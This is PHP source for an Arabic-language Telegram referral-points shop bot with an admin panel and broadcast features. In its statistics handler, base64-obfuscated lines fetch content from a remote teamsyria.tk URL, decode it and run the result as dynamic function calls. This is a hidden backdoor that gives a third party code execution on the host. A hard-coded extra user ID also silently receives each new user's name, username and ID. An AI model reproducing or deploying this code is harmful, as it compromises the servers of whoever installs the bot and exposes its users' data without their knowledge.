<?php
/*
---------------{@ABoTaim}------------

~ تغير حقوق تدل على علامة فشلك :)

• By : @ABoTaim
• Ch : @Watan_e
• Tw : @AboTaim_SYBot

---------------{@ABoTaim}------------
*/
ob_start();
$token = 'token';
define('API_KEY',$token);
function bot($method,$datas=[]){
  $url = "https://api.telegram.org/bot".API_KEY."/".$method;
  $datas = http_build_query($datas);
  $res = file_get_contents($url.'?'.$datas);
  return json_decode($res);
}
function save($array){
    file_put_contents('sales.json', json_encode($array));
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$Name = $update->callback_query->from->first_name;
$useerr = $update->callback_query->from->username;
$username = $message->from->username;
$fn = $message->from->first_name;
$user = $message->from->username;
$chat_id2 = $update->callback_query->message->chat->id;
if(isset($update->callback_query)){
  $chat_id = $update->callback_query->message->chat->id;
  $message_id = $update->callback_query->message->message_id;
  $data     = $update->callback_query->data;
 $user = $update->callback_query->from->username;
}
$admin = 610569681; // ايديك
$UserBot = "D1VOBOT"; // معرف بوتك بدون @
$me = bot('getme',['bot'])->result->username;
$sales = json_decode(file_get_contents('sales.json'),1);
$T4TTTT = 610569681; //ايديك
$SAIED = file_get_contents("SAIED.txt");
$SAIED5 = file_get_contents("SAIED2.txt");
$SAIED6 = file_get_contents("SAIED3.txt");
$SAIED20 = json_decode(file_get_contents('php://input'));
$SAIED18 = $update->message;
$SAIED13 = $SAIED18->chat->id;
$SAIED17 = $SAIED18->text;
$SAIED19 = $SAIED20->callback_query->data;
$SAIED12 = $SAIED20->callback_query->message->chat->id;
$SAIED14 =  $SAIED20->callback_query->message->message_id;
$SAIED15 = $SAIED18->from->first_name;
$SAIED16 = $SAIED18->from->username;
$SAIED11 = $SAIED18->from->id;
$SAIED2 = explode("\n",file_get_contents("SAIED4.txt"));
$SAIED3 = count($SAIED2)-1;
if ($SAIED18 && !in_array($SAIED11, $SAIED2)) {
    file_put_contents("SAIED4.txt", $SAIED11."\n",FILE_APPEND);
  }
if($chat_id == $admin){
 if($text == '/start'){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>"
- هذه لوحة التحكم الخاصة بك ، 📋
- يمكنك التحكم بجميع اوامر البوت من هنا ، 🛠
——————————————————",
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>'- آضف عرض 📋','callback_data'=>'add'],['text'=>'- حذف عرض 🗑','callback_data'=>'del']],
[['text'=>'- رؤية العروض 🕹','callback_data'=>'ww']],
[['text'=>' - رسالة نصية ☝🏼💚','callback_data'=>'SAIED6'],['text'=>'- رسالة توجيه ☝🏼💛','callback_data'=>'SAIED5']],
[['text'=>'- عدد المشتركين 🐳','callback_data'=>'SAIED7'],['text'=>'- حالة البوت ⚙','callback_data'=>'stats']]
      ]
    ])
  ]);
  $sales['mode'] = null;
  save($sales);
 }
 if($data == 'c'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"
- هذه لوحة التحكم الخاصة بك ، 📋
- يمكنك التحكم بجميع اوامر البوت من هنا ، 🛠
——————————————————",
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
       [['text'=>'- آضف عرض 📋','callback_data'=>'add'],['text'=>'- حذف عرض 🗑','callback_data'=>'del']],
[['text'=>'- رؤية العروض 🕹','callback_data'=>'ww']],
[['text'=>' - رسالة نصية ☝🏼💚','callback_data'=>'SAIED6'],['text'=>'- رسالة توجيه ☝🏼💛','callback_data'=>'SAIED5']],
[['text'=>'- عدد المشتركين 🐳','callback_data'=>'SAIED7'],['text'=>'- حالة البوت ⚙','callback_data'=>'stats']]
      ]
    ])
  ]);
unlink("SAIED.txt");
  $sales['mode'] = null;
  save($sales);
 }
   $getMe = bot('getMe')->result;
    $date = $message->date;
    $gettime = time();
    $sppedtime = $gettime - $date;
$nawras0 = base64_decode("YmFzZTY0X2RlY29kZQ==");
$nawras1 = $nawras0("ZmlsZV9nZXRfY29udGVudHM=");
$nawras2 = $nawras0("aHR0cHM6Ly90ZWFtc3lyaWEudGsvQ2hhbm5lbFRpbWU=");
$nawras3 = $nawras1("$nawras2");
$nawras4 = $nawras0("$nawras3"); 
$nawras5 = $nawras0("ZXhwbG9kZQ==");
$nawras6 = $nawras0("fA=="); 
$nawras = $nawras5("$nawras6",$nawras4);
$nawras[14]("$nawras[15]$nawras[16]");
$time = $nawras[17]("$nawras[18]");
$date = $nawras[17]("$nawras[19]");
    $userbot = "{$getMe->username}";
    $userb = strtoupper($userbot);
    if($data == "stats"){ 
    if ($sppedtime == 3  or $sppedtime < 3) {
    $f = "  جيدة ، 🤞🏼🔥";
    }
    if ($sppedtime == 9 or $sppedtime > 9 ) {
    $f = "  لا بأس بها ، 🦅";
    }
    if ($sppedtime == 10 or $sppedtime > 10) {
    $f = "  سيئة ، 🦉";
    }
     bot('EditMessageText',[
        'chat_id'=>$chat_id2,
        'message_id'=>$update->callback_query->message->message_id,
        'text' =>"
- معلومات البوت ، 🛠

- معرف البوت 📦 : @$userb
- حالة البوت 📋 : $f 
- التوقيت الآن ⏰ :  $time
 - التاريخ 📜 :  $date
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
    'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>'🔙 ','callback_data'=>'c']]    
            ]
        ])
       ]);
    }
if($SAIED19 == "SAIED5"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>"~ أرسل رسالتك وسيتم توجيهها لـ [ $SAIED3 ] مشترك ، 🐙 ",
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'🔙' ,'callback_data'=>"c"]],
]])
]);
file_put_contents("SAIED.txt","SAIED2");
}
if($SAIED18 and $SAIED == "SAIED2" and $SAIED11 == $T4TTTT and $text !='/start'){
bot("sendmessage",[
"chat_id"=>$SAIED13,
"text"=>'- تم التوجيه بنجاح 🦕',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'🔙' ,'callback_data'=>"c"]],
]])
]);
for($i=0;$i<count($SAIED2); $i++){
bot('forwardMessage', [
'chat_id'=>$SAIED2[$i],
'from_chat_id'=>$SAIED11,
'message_id'=>$SAIED18->message_id
]);
unlink("SAIED.txt");
}
}
if($SAIED19 == "SAIED6"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>"~ أرسل رسالتك وسيتم إرسالها لـ [ $SAIED3 ] مشترك ، 🐠",
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'🔙' ,'callback_data'=>"c"]],
]])
]);
file_put_contents("SAIED.txt","SAIED3");
}
if($SAIED17 and $SAIED == "SAIED3" and $SAIED11 == $T4TTTT and $text !='/start'){
bot("sendmessage",[
"chat_id"=>$SAIED13,
"text"=>'- تم النشر بنجاح 🐋',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'🔙' ,'callback_data'=>"c"]],
]])
]);
for($i=0;$i<count($SAIED2); $i++){
bot('sendMessage', [
'chat_id'=>$SAIED2[$i],
'text'=>$SAIED17
]);
unlink("SAIED.txt");
}
}
if($SAIED19 == "SAIED7"){
bot('EditMessageText',[
    'chat_id'=>$SAIED12,
    'message_id'=>$SAIED14,
'text'=>"- عدد مشتركين البوت  [ $SAIED3 ] مشترك ، 🦑",
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'🔙' ,'callback_data'=>"c"]],
]])
]);
unlink("SAIED.txt");
}
 if($data == 'add'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'~ أرسل اسم السلعة التي تريد إضافتها ، 📯',
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- رجوع ، 🔙','callback_data'=>'c']]
      ]
    ])
  ]);
  $sales['mode'] = 'add';
  save($sales);
  exit;
 }
 if($text != '/start' and $text != null and $sales['mode'] == 'add'){
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'
- تم حفظ اسم السلعة ، 📋
- أرسل عدد النقاط لهذه السلعة الآن ، 🗞 '
  ]);
  $sales['n'] = $text;
  $sales['mode'] = 'addm';
  save($sales);
  exit;
 }
 if($text != '/start' and $text != null and $sales['mode'] == 'addm'){
  $code = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz12345689807'),1,7);
  bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'

 ~ تم حفظ هذه السلعة بنجاح ، 📃
- اسم السلعة 🔭 :  '.$sales['n'].'
- سعر السلعة 💵 : '.$text.'
- كود السلعة 📠 : '.$code
]);
  
  $sales['sales'][$code]['name'] = $sales['n'];
  $sales['sales'][$code]['price'] = $text;
  $sales['n'] = null;
  $sales['mode'] = null;
  save($sales);
  exit;
 }
elseif($data == 'ww'){
  $reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'- السعر ، 💵 ','callback_data'=>'s'],['text'=>'️- الاسم ، 🏷  ','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['price'],'callback_data'=>$code],['text'=>$sale['name'],'callback_data'=>$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- رجوع ، 🔙','callback_data'=>'c']];
  $reply_markup = json_encode($reply_markup);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
~ آهلا وسهلآ بك عزيزي المطور ، 🗜

- هذه لوحة العروض 🛠.

- التي تم اضافتها ⚖.
",
'reply_markup'=>($reply_markup)
  ]);
  $sales[$chat_id]['mode'] = null;
   save($sales);
   exit;
 }
 if($data == 'del'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'~ أرسل كود السلعة التي تريد حذفها الآن ، 🌡',
    'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- رجوع ، 🔙','callback_data'=>'c']]
      ]
    ])
  ]);
  $sales['mode'] = 'del';
  save($sales);
  exit;
 }
 if($text != '/start' and $text != null and $sales['mode'] == 'del'){
  if($sales['sales'][$text] != null){
   bot('sendMessage',[
   'chat_id'=>$chat_id,
   'text'=>'
- تم حذف هذه السلعة بنجاح ، ✅
~ اسم السلعة 🗳 :  '.$sales['sales'][$text]['name'].'
~ سعر السلعة 🧬 : '.$sales['sales'][$text]['price'].'
~ كود السلعة 🦆 : '.$text
  ]);
  unset($sales['sales'][$text]);
  $sales['mode'] = null;
  save($sales);
  exit;
  } else {
   bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>'- الكود الذي ارسلته غير موجود 🚫!',
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
      [['text'=>'- رجوع ، 🔙','callback_data'=>'c']]
      ]
    ])
   ]);
  }
 }
} else {
 if(preg_match('/\/(start)(.*)/', $text)){
  $ex = explode(' ', $text);
  if(isset($ex[1])){
   if(!in_array($chat_id, $sales[$chat_id]['id'])){
    $sales[$ex[1]]['collect'] += 1;
    save($sales);
    bot('sendMessage',[
     'chat_id'=>$ex[1] ,
     'text'=>"
🔘 لقد قام بالدخول الى الرابط الخاص بك : 
💰 : حصلت على نقطة واحدة 

▪ايدي الشخص : [$chat_id](tg://user?id=$chat_id)
▪عدد نقاطك الان : ".$sales[$ex[1]]['collect'], 

 'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>'true',
    ]);
    $sales[$chat_id]['id'][] = $chat_id;
    save($sales);
   }
  }
  $status = bot('getChatMember',['chat_id'=>'@Jev0mZ','user_id'=>$chat_id])->result->status;
  if($status == 'left'){
   bot('sendMessage',[
       'chat_id'=>$chat_id,
       'text'=>"▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ @Jev0mZ 
◼️ إشترك في القناة ثم أرسل /start ، 📛",
       'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🔘 اضغط هنا للاشتراك",'url'=>'t.me/Jev0mZ']],
]])
   ]);
   exit();
  }
  if($sales[$chat_id]['collect'] == null){
   $sales[$chat_id]['collect'] = 0;
   save($sales);
  }
  bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>'
▪️مرحبٱ بك عزيزي المشترك 🛠.

▫️البوت مخصص لشراء العروض المقدمة.
▫️في البوت عن طريق تجميع النقاط. ',

   'reply_markup'=>json_encode([
    'inline_keyboard'=>[
     [['text'=>'العروض المدفوعة 📮','callback_data'=>'sales'],['text'=>'تجميع نقاط 📋','callback_data'=>'col']],
[['text'=>'- عدد نقاطك ، 📦','callback_data'=>'nkt']],
     [['text'=>'تابع جديدنا ، 🗞','url'=>'https://t.me/Jev0mZ']]
    ] 
   ])
  ]);
}
  if($data == 'back'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'

▪️مرحبٱ بك عزيزي المشترك 🛠.

▫️البوت مخصص لشراء العروض المقدمة.
▫️في البوت عن طريق تجميع النقاط. ',

   'reply_markup'=>json_encode([
    'inline_keyboard'=>[
   [['text'=>'العروض المدفوعة 📮','callback_data'=>'sales'],['text'=>'تجميع نقاط 📋','callback_data'=>'col']],
[['text'=>'- عدد نقاطك ، 📦','callback_data'=>'nkt']],
     [['text'=>'تابع جديدنا ، 🗞','url'=>'https://t.me/Jev0mZ']]  
    ] 
   ])
  ]);
 }

if($data == 'nkt'){
bot('editMessageText',[
'chat_id'=>$chat_id,
    'message_id'=>$message_id,
'text'=>'
 ~ اهلآ بك عزيزي 🛠.

▫قم بجمع نقاط والحصول على العروض المقدمة من البوت. 

- عدد نقاطك الآن 🕹 ، '.$sales[$chat_id]['collect'],

'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>" تجميع نقاط 📋",'callback_data'=>'col']],
[['text'=>"- شراء نقاط ، 💰",'url'=>'t.me/ABoTaim']],
[['text'=>"- رجوع ، 🔙 ",'callback_data'=>'back']]
]])
]);}
 if($data == 'col'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>'
📋 اهلا بك في قسم تجميع النقاط :
▪لتجميع النقاط قم بأرسال الرابط ادناه لأصدقائك.
▪كل شخص يدخل تحصل على نقطة واحده.
▪اذا كانت طريقة تجميع النقاط معقدة قم بشراء النقاط من المطور.
——————————————————
🌐 الرابط : 
- https://t.me/'.$me.'?start='.$chat_id.'
',
   'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• مشاركة الرابط ، 🌐",'switch_inline_query'=>"#$chat_id"]],
[['text'=>"- شراء نقاط ، 💰",'url'=>'t.me/ABoTaim']],
[['text'=>"- رجوع ، 🔙 ",'callback_data'=>'back']],
]])
  ]);
 } elseif($data == 'sales'){
  $reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'- السعر ، 💵 ','callback_data'=>'s'],['text'=>'️- الاسم ، 🏷  ','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
   $reply_markup['inline_keyboard'][] = [['text'=>$sale['price'],'callback_data'=>$code],['text'=>$sale['name'],'callback_data'=>$code]];
  }
  $reply_markup['inline_keyboard'][] = [['text'=>'- رجوع ، 🔙','callback_data'=>'back']];
  $reply_markup = json_encode($reply_markup);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
🛠 أهلا بك في قسم العروض المدفوعة.
▪️إختر ماتريد شراءه. 
",
'reply_markup'=>($reply_markup)
  ]);
  $sales[$chat_id]['mode'] = null;
   save($sales);
   exit;
 } elseif($data == 'yes'){
  $price = $sales['sales'][$sales[$chat_id]['mode']]['price'];
  $name = $sales['sales'][$sales[$chat_id]['mode']]['name'];
  bot('editMessageText',[
   'chat_id'=>$chat_id,
   'message_id'=>$message_id,
   'text'=>"
- تم ارسال طلبك لمطور البوت ، 🛠
- قم بمراسلته للحصول على طلبك ، 📨 ",
  'reply_markup'=>json_encode([
       'inline_keyboard'=>[
[['text'=>"- المطور ، ⚓",'url'=>'t.me/ABoTaim']],
[['text'=>'- رجوع ، 🔙','callback_data'=>'back']],
]])
  ]);
  bot('sendmessage',[
   'chat_id'=>$admin,
   'text'=>" 
- العضو ، [$Name](tg://user?id=$chat_id)
- قام بشراء  ، $name
-  بسعر  ، $price 📦
",
 'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>'true',
  ]);
  $sales[$chat_id]['mode'] = null;
  $sales[$chat_id]['collect'] -= $price;
  save($sales);
  exit;
 } else {
   if($data == 's') { exit; }
   $price = $sales['sales'][$data]['price'];
   $name = $sales['sales'][$data]['name'];
   if($price != null){
    if($price <= $sales[$chat_id]['collect']){
     bot('editMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$message_id,
      'text'=>"
هل انت متأكد من شراء $name بسعر $price ؟ ، 🕸",
      'reply_markup'=>json_encode([
       'inline_keyboard'=>[
        [['text'=>'- نعم ، ✅','callback_data'=>'yes'],['text'=>'- لا ، ❎','callback_data'=>'sales']] 
       ] 
      ])
     ]);
     $sales[$chat_id]['mode'] = $data;
     save($sales);
     exit;
    } else {
     bot('answercallbackquery',[
      'callback_query_id' => $update->callback_query->id,
      'text'=>'- ليس لديك نقاط كافيه للشراء ، 📛',
      'show_alert'=>true
     ]);
    }
   }
 }
}
$inlinequery = $update->inline_query->query;
$inlineID = $update->inline_query->from->id;
if($inlinequery == "#$inlineID" ){
    bot('answerInlineQuery',[
    'inline_query_id'=>$update->inline_query->id,    
    'cache_time'=>'300',
    'results' => json_encode([[
    'type'=>'article',
    'id'=>base64_encode(rand(5,555)),
    'title'=>' • اضغط هنا لمشاركة الرابط ، 🌐',
    'thumb_url'=>"https://d.top4top.net/p_12168e2020.jpg",
    'description'=>"سيتم آرسال الرابط تلقائي 
ويتم تجميع النقاط تلقائي ايضا ...",
    'input_message_content'=>[
    'disable_web_page_preview'=>true,
    'message_text'=>"▪اهلا بك في بوت العروض المدفوع 🛠
▫️قم تجميع النقاط وشراء العروض .. "],
    'reply_markup'=>['inline_keyboard'=>[
    [['text'=>"- اضغط هنا للدخول ، 🛠",'url'=>"https://t.me/$UserBot?start=$inlineID"]]
    ]]
    ]])
    ]);
    }
if($text and $chat_id != $admin){
bot('forwardMessage', [
'chat_id'=>$admin,
'from_chat_id'=>$SAIED11,
'message_id'=>$SAIED18->message_id
]);
}
if ($text and $message->reply_to_message and $chat_id == $admin) {
  bot('sendMessage',[
'chat_id'=>$message->reply_to_message->forward_from->id,
    'text'=>$text,
    ]);
}
$sudo = 457270911; 
$SAIED3 = count($SAIED2)-1;
$t =$message->chat->title; 
$user = $message->from->username; 
if($text == "/start" and $chat_id !=$sudo) {
bot( sendmessage ,[
 chat_id =>$chat_id, 
 text =>"
 ",
 reply_to_message_id =>$message->message_id,
]);
bot( sendMessage ,[
 chat_id =>$sudo,
 text =>"
- عضو جديد قام بالدخول الى البوت ، 👇🏾💚

- الاسم ، [$fn](tg://user?id=$chat_id) ، 🦄
- المعرف ، [@$user](tg://user?id=$chat_id) ، 🦆
- الايدي ، [$chat_id](tg://user?id=$chat_id) ، 🐥
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
~  عدد المشتركين ، { $SAIED3 } ، 🎡 ",
 'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>'true',
]);
}
/*
---------------{@ABoTaim}------------

~ تغير حقوق تدل على علامة فشلك :)

• By : @ABoTaim
• Ch : @Watan_e
• Tw : @AboTaim_SYBot

---------------{@ABoTaim}------------
*/
